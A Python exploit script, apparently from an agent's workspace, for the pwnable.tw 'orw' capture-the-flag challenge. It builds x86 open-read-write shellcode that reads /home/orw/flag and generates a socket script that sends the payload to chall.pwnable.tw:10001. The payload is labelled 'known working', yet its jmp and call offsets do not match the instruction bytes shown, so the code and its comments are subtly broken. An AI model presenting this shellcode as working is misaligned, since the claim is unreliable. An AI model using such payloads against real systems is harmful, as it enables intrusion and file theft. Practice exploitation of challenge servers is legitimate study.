#!/usr/bin/env python3

# Known working ORW shellcode pattern

def create_known_working_shellcode():
    # This is a shellcode pattern that's known to work for ORW challenges
    shellcode = b""
    
    # jmp-call-pop technique
    shellcode += b"\xeb\x36"              # jmp 0x38
    
    # pop instruction (executed after call)
    shellcode += b"\x5e"                  # pop esi (get string address)
    
    # open("/home/orw/flag", O_RDONLY, 0)
    shellcode += b"\x31\xc0"              # xor eax, eax
    shellcode += b"\x88\x46\x0e"          # mov [esi+14], al (null terminate string)
    shellcode += b"\x89\xf3"              # mov ebx, esi (filename)
    shellcode += b"\x31\xc9"              # xor ecx, ecx (O_RDONLY = 0)
    shellcode += b"\x31\xd2"              # xor edx, edx (mode = 0)
    shellcode += b"\xb0\x05"              # mov al, 5 (sys_open)
    shellcode += b"\xcd\x80"              # int 0x80
    
    # read(fd, buffer, 100)
    shellcode += b"\x89\xc3"              # mov ebx, eax (file descriptor)
    shellcode += b"\x89\xf1"              # mov ecx, esi (buffer - reuse string location)
    shellcode += b"\x31\xd2"              # xor edx, edx
    shellcode += b"\xb2\x64"              # mov dl, 100 (read 100 bytes)
    shellcode += b"\x31\xc0"              # xor eax, eax
    shellcode += b"\xb0\x03"              # mov al, 3 (sys_read)
    shellcode += b"\xcd\x80"              # int 0x80
    
    # write(1, buffer, bytes_read)
    shellcode += b"\x89\xc2"              # mov edx, eax (bytes read)
    shellcode += b"\x31\xc0"              # xor eax, eax
    shellcode += b"\xb0\x04"              # mov al, 4 (sys_write)
    shellcode += b"\xb3\x01"              # mov bl, 1 (stdout)
    shellcode += b"\xcd\x80"              # int 0x80
    
    # exit(0)
    shellcode += b"\x31\xc0"              # xor eax, eax
    shellcode += b"\x40"                  # inc eax (sys_exit = 1)
    shellcode += b"\xcd\x80"              # int 0x80
    
    # call instruction - this pushes the string address and jumps back
    shellcode += b"\xe8\xc5\xff\xff\xff"  # call $-0x3b
    
    # String: "/home/orw/flag" (14 bytes)
    shellcode += b"/home/orw/flag"
    
    return shellcode

def main():
    shellcode = create_known_working_shellcode()
    print(f"Known working shellcode: {len(shellcode)} bytes")
    print(f"Hex: {shellcode.hex()}")
    
    # Write to file
    with open('/workspace/orw_challenge/known_working.bin', 'wb') as f:
        f.write(shellcode)
    
    print("Shellcode written to known_working.bin")
    
    # Create a script to send it
    with open('/workspace/orw_challenge/send_known.py', 'w') as f:
        f.write(f'''#!/usr/bin/env python3
import socket
import time

shellcode = bytes.fromhex("{shellcode.hex()}")

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("chall.pwnable.tw", 10001))

# Get prompt
data = s.recv(1024)
print(data.decode())

# Send shellcode
s.send(shellcode)

# Get response
time.sleep(1)
response = s.recv(1024)
print(response.decode())

s.close()
''')
    
    print("Script created: send_known.py")

if __name__ == "__main__":
    main()